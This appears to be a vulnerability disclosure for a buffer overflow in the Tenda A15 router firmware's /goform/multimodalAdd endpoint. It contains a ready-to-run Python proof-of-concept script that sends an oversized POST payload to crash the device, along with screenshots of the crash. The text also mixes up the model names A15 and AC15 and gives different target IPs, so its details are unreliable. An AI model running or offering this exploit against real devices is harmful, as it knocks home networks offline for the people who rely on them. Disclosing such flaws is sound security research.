# Tenda A15 V15.13.07.13 has a buffer overflow vulnerability

# Vulnerable URL
http://192.168.159.128/goform/multimodalAdd

# Vulnerability Description

Tenda A15 is a dual-band three-gigabit wireless router suitable for fiber-optic homes within 1000 megabits, supporting gigabit ports, intelligent frequency selection, parental control and other functions. 
Shenzhen Jixiang Tenda Technology Co., Ltd. AC15 has a binary vulnerability that can be exploited by attackers to cause a denial of service.

# Firmware Information

https://www.tendacn.com/download/detail-3187.html
![image](https://github.com/user-attachments/assets/00a3dce8-4bd3-4c6c-93ec-4caeeaedab06)


# Payload：
exp.py
```
import requests

url = "http://192.168.85.160/goform/multimodalAdd"
data = {
    "HTTP/1.1 200 OK\r\nContent-Length:%d\r\nContent-type: text/plain; charset=utf-8\r\nPrag ma: no-cache\r\nCache-Control: no-cache\r\n\r\n":b'A'*1000000000
}
res = requests.post(url=url,data=data)
print(res.content)
```

<img width="547" alt="image" src="https://github.com/user-attachments/assets/fa358890-c6e3-4140-a91b-d03f5edad2d7" />


When running the exp.py script, the memory is filled up and the device crashes.

<img width="640" alt="image" src="https://github.com/user-attachments/assets/18814639-0abd-40b8-8b0d-dcda60649a23" />

![image](https://github.com/user-attachments/assets/87a3abce-af4f-40d4-a652-02fc29d8d7ab)

